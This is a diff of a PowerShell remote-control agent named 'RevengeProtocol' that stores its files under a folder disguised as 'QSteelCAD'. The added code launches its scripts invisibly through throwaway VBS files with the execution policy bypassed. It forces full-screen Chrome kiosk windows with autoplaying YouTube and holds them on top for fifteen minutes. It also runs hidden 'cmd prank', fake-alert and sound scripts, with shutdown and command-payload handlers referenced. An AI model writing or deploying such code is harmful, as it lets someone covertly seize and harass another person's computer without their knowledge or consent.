@@ -112,6 +112,68 @@ function Get-ChromePath {
   return $null
 }
 
+function Convert-YoutubePlaybackUrl([string]$Url) {
+  $id = $null
+  if ($Url -match '[?&]v=([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
+  elseif ($Url -match 'youtu\.be/([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
+  elseif ($Url -match 'youtube\.com/embed/([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
+  elseif ($Url -match 'youtube\.com/shorts/([A-Za-z0-9_-]{6,})') { $id = $Matches[1] }
+  if ($id) {
+    return "https://www.youtube.com/embed/${id}?autoplay=1&rel=0&modestbranding=1"
+  }
+  if ($Url -match 'youtube|youtu\.be' -and $Url -notmatch 'autoplay=') {
+    if ($Url.Contains('?')) { return ($Url + '&autoplay=1') }
+    return ($Url + '?autoplay=1')
+  }
+  return $Url
+}
+
+# İkinci powershell konsolu açılmaz: wscript pencere stili 0. Yol boşlukları tırnaklı.
+function Start-RpHiddenFile {
+  param(
+    [Parameter(Mandatory)][string]$ScriptPath,
+    [string[]]$ScriptArgs = @(),
+    [switch]$Sta
+  )
+  if (-not (Test-Path -LiteralPath $ScriptPath)) { return }
+  $ps = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
+  $flags = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden'
+  if ($Sta) { $flags += ' -Sta' }
+  $tail = ''
+  foreach ($a in $ScriptArgs) {
+    $clean = ([string]$a) -replace '"', ''
+    $tail += ' "' + $clean + '"'
+  }
+  $cmd = $ps + ' ' + $flags + ' -File "' + $ScriptPath + '"' + $tail
+  $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
+  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+  $vbs = Join-Path $dir ('run-' + [guid]::NewGuid().ToString('N') + '.vbs')
+  $vbsCmd = $cmd.Replace('"', '""')
+  @(
+    'Set sh = CreateObject("Wscript.Shell")',
+    ('sh.Run "' + $vbsCmd + '", 0, False')
+  ) | Set-Content -LiteralPath $vbs -Encoding ASCII
+  $ws = Join-Path $env:SystemRoot 'System32\wscript.exe'
+  Start-Process -FilePath $ws -ArgumentList @('//B', $vbs) -WindowStyle Hidden | Out-Null
+}
+
+function Start-TopmostWatch([string]$Like, [int]$Seconds) {
+  $root = $PSScriptRoot
+  $ps = [powershell]::Create()
+  [void]$ps.AddScript({
+    param($root, $like, $seconds)
+    $ErrorActionPreference = 'SilentlyContinue'
+    . (Join-Path $root 'window-top.ps1')
+    $end = (Get-Date).AddSeconds([Math]::Max(5, $seconds))
+    while ((Get-Date) -lt $end) {
+      $pids = @(Get-RpPids -ProcessName 'chrome.exe' -CommandLike $like)
+      Invoke-RpRaisePids -Pids $pids
+      Start-Sleep -Milliseconds 450
+    }
+  }).AddArgument($root).AddArgument($Like).AddArgument($Seconds)
+  [void]$ps.BeginInvoke()
+}
+
 function Open-Kiosk([string]$Url) {
   if (-not $Url) { return }
   $chrome = Get-ChromePath
@@ -121,25 +183,15 @@ function Open-Kiosk([string]$Url) {
   }
   $profile = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol\chrome-session'
   if (-not (Test-Path $profile)) { New-Item -ItemType Directory -Path $profile -Force | Out-Null }
-  Write-AgentLog ('open_url chrome incognito: ' + $Url)
-  # Ayrı user-data-dir: açık Chrome bayrakları yutmasın, IE'ye düşmesin
-  Start-Process -FilePath $chrome -ArgumentList @(
-    "--user-data-dir=$profile",
-    '--incognito',
-    '--new-window',
-    '--start-fullscreen',
-    '--no-first-run',
-    '--no-default-browser-check',
-    '--disable-infobars',
-    $Url
-  ) | Out-Null
-  $raiser = Join-Path $PSScriptRoot 'raise-top.ps1'
-  if (Test-Path -LiteralPath $raiser) {
-    Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList @(
-      '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
-      '-File', $raiser, '-ProcessName', 'chrome.exe', '-CommandLike', 'chrome-session', '-Seconds', '20'
-    ) | Out-Null
-  }
+  $target = Convert-YoutubePlaybackUrl $Url
+  Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { $_.CommandLine -like '*RevengeProtocol\chrome-session*' } |
+    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+  Start-Sleep -Milliseconds 350
+  Write-AgentLog ('open_url kiosk: ' + $target)
+  $chromeArgs = "--user-data-dir=`"$profile`" --kiosk --autoplay-policy=no-user-gesture-required --no-first-run --no-default-browser-check --disable-infobars --disable-session-crashed-bubble --disable-features=TranslateUI `"$target`""
+  Start-Process -FilePath $chrome -ArgumentList $chromeArgs | Out-Null
+  Start-TopmostWatch -Like 'chrome-session' -Seconds 900
 }
 
 function Invoke-Shutdown([bool]$Restart) {
@@ -154,10 +206,10 @@ $script:SoundsJob = $null
 $script:CmdJob = $null
 
 function Stop-CmdPrank {
-  if ($script:CmdJob -and $script:CmdJob.Id) {
-    Stop-Process -Id $script:CmdJob.Id -Force -ErrorAction SilentlyContinue
-    $script:CmdJob = $null
-  }
+  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { $_.CommandLine -like '*cmd-prank-worker.ps1*' } |
+    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+  $script:CmdJob = $null
 }
 
 function Invoke-CmdPrank($cmd) {
@@ -181,17 +233,13 @@ function Invoke-CmdPrank($cmd) {
   if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
   $linesFile = Join-Path $dir 'cmd-lines.txt'
   [System.IO.File]::WriteAllLines($linesFile, $lines, [System.Text.UTF8Encoding]::new($false))
-  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
   Write-AgentLog ('cmd_prank mode=' + $mode)
-  # Start-Job masaüstünde pencere açmaz — etkileşimli süreç şart
-  $script:CmdJob = Start-Process -FilePath $ps -PassThru -ArgumentList @(
-    '-NoProfile', '-ExecutionPolicy', 'Bypass',
-    '-File', $worker,
+  Start-RpHiddenFile -ScriptPath $worker -ScriptArgs @(
     '-Mode', $mode,
-    '-FlashCount', $flashCount,
-    '-FlashMs', $flashMs,
-    '-FlashPlainMs', $flashPlainMs,
-    '-LoopCount', $loopCount,
+    '-FlashCount', "$flashCount",
+    '-FlashMs', "$flashMs",
+    '-FlashPlainMs', "$flashPlainMs",
+    '-LoopCount', "$loopCount",
     '-LinesFile', $linesFile
   )
 }
@@ -208,20 +256,16 @@ function Invoke-WinAlert($cmd) {
   if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
   $msgFile = Join-Path $dir 'last-win-alert.txt'
   [System.IO.File]::WriteAllText($msgFile, $msg, [System.Text.UTF8Encoding]::new($false))
-  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
   $preview = $msg.Substring(0, [Math]::Min(60, $msg.Length))
   Write-AgentLog ('win_alert start: ' + $preview)
-  Start-Process -FilePath $ps -ArgumentList @(
-    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Sta',
-    '-File', $script, '-MessageFile', $msgFile, '-DurationSec', $sec
-  ) | Out-Null
+  Start-RpHiddenFile -ScriptPath $script -Sta -ScriptArgs @('-MessageFile', $msgFile, '-DurationSec', "$sec")
 }
 
 function Stop-FunnySounds {
-  if ($script:SoundsJob -and $script:SoundsJob.Id) {
-    Stop-Process -Id $script:SoundsJob.Id -Force -ErrorAction SilentlyContinue
-    $script:SoundsJob = $null
-  }
+  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+    Where-Object { $_.CommandLine -like '*play-sounds.ps1*' } |
+    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+  $script:SoundsJob = $null
 }
 
 function Invoke-FunnySounds([int]$DurationSec) {
@@ -232,12 +276,8 @@ function Invoke-FunnySounds([int]$DurationSec) {
     Write-AgentLog 'sounds FAIL: play-sounds.ps1 yok'
     return
   }
-  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
   Write-AgentLog ('sounds sec=' + $DurationSec)
-  $script:SoundsJob = Start-Process -FilePath $ps -PassThru -WindowStyle Hidden -ArgumentList @(
-    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
-    '-File', $player, '-DurationSec', $DurationSec
-  )
+  Start-RpHiddenFile -ScriptPath $player -ScriptArgs @('-DurationSec', "$DurationSec")
 }
 
 function Invoke-CommandPayload($cmd) {
